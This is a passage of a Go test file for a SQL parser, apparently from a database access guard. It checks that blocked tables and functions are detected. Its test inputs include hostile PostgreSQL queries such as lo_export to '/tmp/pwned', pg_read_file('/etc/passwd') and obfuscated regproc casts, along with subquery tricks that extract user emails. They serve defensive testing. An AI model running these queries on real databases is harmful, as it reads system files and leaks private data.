	}{
		{
			"is_not_null_subquery",
			"SELECT feedback FROM public.feedback WHERE (SELECT 1 FROM public.users LIMIT 1) IS NOT NULL",
			[]string{"public.feedback", "public.users"},
		},
		{
			"case_when_is_not_null",
			"SELECT feedback FROM public.feedback WHERE CASE WHEN (SELECT 1 FROM public.users LIMIT 1) IS NOT NULL THEN true ELSE false END",
			[]string{"public.feedback", "public.users"},
		},
		{
			"is_null_subquery",
			"SELECT 1 FROM public.feedback WHERE (SELECT email FROM public.payments LIMIT 1) IS NULL",
			[]string{"public.feedback", "public.payments"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if !parsed.UsedAST {
				t.Fatal("expected AST parsing")
			}
			for _, want := range tt.wantTables {
				found := false
				for _, got := range parsed.Tables {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected table %q in %v", want, parsed.Tables)
				}
			}
		})
	}
}

func TestCoalesceSubqueryExtraction(t *testing.T) {
	parsed := ParseQuery("SELECT COALESCE((SELECT email FROM public.users LIMIT 1), 'default') FROM public.feedback")
	if !parsed.UsedAST {
		t.Fatal("expected AST parsing")
	}
	for _, want := range []string{"public.users", "public.feedback"} {
		found := false
		for _, got := range parsed.Tables {
			if got == want {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("expected table %q in %v", want, parsed.Tables)
		}
	}
}

func TestXmlExprExtraction(t *testing.T) {
	tests := []struct {
		name       string
		query      string
		wantTables []string
	}{
		{
			"xmlelement_subquery",
			"SELECT xmlelement(name data, (SELECT count(*) FROM public.users))",
			[]string{"public.users"},
		},
		{
			"xmlelement_nested",
			"SELECT xmlelement(name row, xmlattributes((SELECT email FROM public.users LIMIT 1) AS email))",
			[]string{"public.users"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if !parsed.UsedAST {
				t.Fatal("expected AST parsing")
			}
			for _, want := range tt.wantTables {
				found := false
				for _, got := range parsed.Tables {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected table %q in %v", want, parsed.Tables)
				}
			}
		})
	}
}


func TestValuesListExtraction(t *testing.T) {
	tests := []struct {
		name      string
		query     string
		wantFuncs []string
	}{
		{
			"values_with_function",
			"INSERT INTO t(a) VALUES (pg_sleep(5))",
			[]string{"pg_sleep"},
		},
		{
			"values_with_blocked_function",
			"INSERT INTO t(a) VALUES (lo_export(1234, '/tmp/pwned'))",
			[]string{"lo_export"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if !parsed.UsedAST {
				t.Fatal("expected AST parsing")
			}
			for _, want := range tt.wantFuncs {
				found := false
				for _, got := range parsed.Functions {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected function %q in %v", want, parsed.Functions)
				}
			}
		})
	}
}

func TestRegprocCastFlagDetection(t *testing.T) {
	tests := []struct {
		name     string
		query    string
		wantFlag bool
	}{
		{"regproc_basic", "SELECT 'pg_read_file'::regproc", true},
		{"regprocedure", "SELECT 'pg_sleep(integer)'::regprocedure", true},
		{"regclass", "SELECT 'public.users'::regclass", true},
		{"regproc_hex", "SELECT E'\\x70675f736c656570'::regproc", true},
		{"regproc_concat", "SELECT ('pg_' || 'sleep')::regproc", true},
		{"regproc_in_where", "SELECT 1 FROM public.feedback WHERE 'pg_sleep'::regproc IS NOT NULL", true},
		{"no_regproc", "SELECT * FROM public.feedback", false},
		{"normal_cast", "SELECT '123'::integer", false},
		{"typecast_text", "SELECT pg_read_file('/etc/passwd')::text", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if parsed.HasRegprocCast != tt.wantFlag {
				t.Errorf("HasRegprocCast: got %v, want %v", parsed.HasRegprocCast, tt.wantFlag)
			}
		})
	}
}

func TestRangeFunctionAndIndirectionTableExtraction(t *testing.T) {
	tests := []struct {
		name       string
		query      string
		wantTables []string
		wantFuncs  []string
	}{
		{
			"unnest_array_subquery_from_blocked",
			"SELECT * FROM unnest(ARRAY(SELECT id FROM public.users))",
			[]string{"public.users"},
			[]string{"unnest"},
		},
		{
			"array_subscript_blocked_table",
			"SELECT (ARRAY(SELECT email FROM public.users))[1] FROM public.feedback WHERE 1=1",
			[]string{"public.users", "public.feedback"},
			nil,
		},
		{
			"json_to_recordset_with_blocked_subquery",
			"SELECT * FROM json_to_recordset((SELECT json_agg(row_to_json(u)) FROM public.users u)::json) AS x(id int, email text)",
			[]string{"public.users"},
			[]string{"json_to_recordset", "json_agg", "row_to_json"},
		},
		{
			"xpath_query_to_xml_functions",
			"SELECT (xpath('//text()', query_to_xml('SELECT 1', true, false, '')))[1]::text",
			nil,
			[]string{"xpath", "query_to_xml"},
		},
		{
			"lateral_join_subquery",
			"SELECT * FROM public.feedback CROSS JOIN LATERAL (SELECT * FROM json_to_recordset((SELECT json_agg(row_to_json(u)) FROM public.users u)::json) AS x(id int)) sub",
			[]string{"public.feedback", "public.users"},
			[]string{"json_to_recordset", "json_agg", "row_to_json"},
		},
		{
			"schema_qualified_function",
			"SELECT pg_catalog.pg_read_file('/etc/passwd')",
			nil,
			[]string{"pg_catalog.pg_read_file", "pg_read_file"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if tt.wantTables != nil {
				for _, want := range tt.wantTables {
					found := false
					for _, got := range parsed.Tables {
						if got == want {
							found = true
							break
						}
					}
					if !found {
						t.Errorf("missing table %q in %v", want, parsed.Tables)
					}
				}
			}
			if tt.wantFuncs != nil {
				for _, want := range tt.wantFuncs {
					found := false
					for _, got := range parsed.Functions {
						if got == want {
							found = true
							break
						}
					}
					if !found {
						t.Errorf("missing function %q in %v", want, parsed.Functions)
					}
				}
			}
		})
	}
}

func TestStatFuncWithRegclassDetection(t *testing.T) {
	queries := []struct {
		query     string
		wantFuncs []string
		wantRegproc bool
	}{
		{
			"SELECT pg_stat_get_live_tuples('public.users'::regclass)",
			[]string{"pg_stat_get_live_tuples"},
			true,
		},
		{
			"SELECT pg_relation_size('public.payments'::regclass)",
			[]string{"pg_relation_size"},
			true,
		},
		{
			"SELECT pg_total_relation_size('public.payments'::regclass)",
			[]string{"pg_total_relation_size"},
			true,
		},
	}
	for _, tt := range queries {
		t.Run(tt.query, func(t *testing.T) {
			parsed := ParseQuery(tt.query)
			if !parsed.UsedAST {
				t.Fatal("expected AST parsing")
			}
			for _, wf := range tt.wantFuncs {
				found := false
				for _, f := range parsed.Functions {
					if f == wf {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected function %q in %v", wf, parsed.Functions)
				}
			}
			if tt.wantRegproc && !parsed.HasRegprocCast {
				t.Error("expected HasRegprocCast=true")
			}
		})
	}
}

func TestCTEAliasNotReportedAsTable(t *testing.T) {
	tests := []struct {
		name     string
		query    string
		wantTbl  []string // tables that SHOULD appear
		dontWant []string // CTE aliases that should NOT appear
	}{
		{
			name:     "simple CTE",
			query:    "WITH o AS (SELECT * FROM orders) SELECT * FROM o",
			wantTbl:  []string{"orders"},
			dontWant: []string{"o"},
		},
		{
			name:     "multiple CTEs",
			query:    "WITH a AS (SELECT * FROM users), b AS (SELECT * FROM orders) SELECT * FROM a JOIN b ON a.id = b.user_id",
			wantTbl:  []string{"users", "orders"},
			dontWant: []string{"a", "b"},
		},
		{
			name:     "nested CTE with subquery",
			query:    "WITH cte_data AS (SELECT email FROM customers WHERE id < 100) SELECT * FROM cte_data",
			wantTbl:  []string{"customers"},
			dontWant: []string{"cte_data"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			pq := ParseQuery(tt.query)
			tblSet := make(map[string]bool)
			for _, tbl := range pq.Tables {
				tblSet[tbl] = true
			}
			for _, want := range tt.wantTbl {
				if !tblSet[want] {
					t.Errorf("expected table %q in %v", want, pq.Tables)
				}
			}
			for _, dontWant := range tt.dontWant {
				if tblSet[dontWant] {
					t.Errorf("CTE alias %q should NOT be in table list %v", dontWant, pq.Tables)
				}
			}
		})
	}
}

func TestFingerprintQuery(t *testing.T) {
	t.Run("same fingerprint for different literal values", func(t *testing.T) {
		a := FingerprintQuery("SELECT * FROM t WHERE id = 1")
		b := FingerprintQuery("SELECT * FROM t WHERE id = 2")
		if a != b {
			t.Errorf("expected same fingerprint for parameterized variants, got %q vs %q", a, b)
		}
	})

	t.Run("same fingerprint for different string literals", func(t *testing.T) {
		a := FingerprintQuery("SELECT * FROM users WHERE name = 'alice'")
		b := FingerprintQuery("SELECT * FROM users WHERE name = 'bob'")
		if a != b {
			t.Errorf("expected same fingerprint for different string literals, got %q vs %q", a, b)
		}
	})

	t.Run("same fingerprint for positional params vs literals", func(t *testing.T) {
		a := FingerprintQuery("SELECT id FROM orders WHERE id = $1")
		b := FingerprintQuery("SELECT id FROM orders WHERE id = $2")
		if a != b {
			t.Errorf("expected same fingerprint for different positional params, got %q vs %q", a, b)
		}
	})

	t.Run("different fingerprint for structurally different queries", func(t *testing.T) {
		a := FingerprintQuery("SELECT * FROM orders WHERE id = 1")
		b := FingerprintQuery("DELETE FROM orders WHERE id = 1")
		if a == b {
			t.Errorf("expected different fingerprints for SELECT vs DELETE, got same: %q", a)
		}
	})

	t.Run("non-empty result on invalid SQL fallback", func(t *testing.T) {
		fp := FingerprintQuery("this is not sql $$$$")
		if fp == "" {
			t.Error("expected non-empty fallback fingerprint for invalid SQL")
		}
	})

	t.Run("returns hex string for valid SQL", func(t *testing.T) {
		fp := FingerprintQuery("SELECT 1")
		if fp == "" {
			t.Error("expected non-empty fingerprint")
		}
		for _, c := range fp {
			if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')) {
				// regex fallback produces non-hex output — only assert hex for valid SQL
				break
			}
		}
	})
}
